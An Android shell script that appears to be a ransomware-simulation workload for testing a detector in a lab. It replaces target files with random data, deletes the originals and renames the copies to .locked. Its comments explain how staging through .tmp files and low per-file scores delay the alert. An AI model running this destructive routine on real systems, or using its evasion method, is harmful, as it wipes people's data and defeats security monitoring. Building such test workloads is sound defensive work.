#!/system/bin/sh
# E2 (Extreme): Stages payload into .tmp (filtered by BENIGN_TEMP_SUFFIXES) and deletes original.
# Each file only scores +2.0 (DELETE), so 6 files = 12.0 (< 15.0 min-score), delaying alert until file 8.
DIR="$(cd "$(dirname "$0")" && pwd)"
WORKLOAD_NAME="E2_temp_stage"
WORKLOAD_LABEL="attack"
. "$DIR/lib.sh"

MAX_FILES="${MAX_FILES:-40}"
DELAY="${DELAY:-0.05}"

verify_lab_env
log_truth "start"

OLD_IFS="$IFS"
IFS='
'
for f in $(list_attack_targets "$MAX_FILES"); do
    IFS="$OLD_IFS"
    [ ! -f "$f" ] && continue
    sz="$(file_size "$f")"
    tmp="${f}.tmp"
    head -c "$sz" /dev/urandom > "$tmp"
    log_truth "create" "$tmp"
    rm -f "$f"
    log_truth "delete" "$f"
    sleep "$DELAY"
done
IFS="$OLD_IFS"

# Phase 2 (if not killed yet): rename staged .tmp files to .locked
IFS='
'
for tmp in $(find "$TARGET_ROOT" -type f -name "*.tmp" 2>/dev/null | sort); do
    IFS="$OLD_IFS"
    locked="${tmp%.tmp}.locked"
    mv "$tmp" "$locked"
    log_truth "rename" "$tmp" "$locked"
done
IFS="$OLD_IFS"

log_truth "end"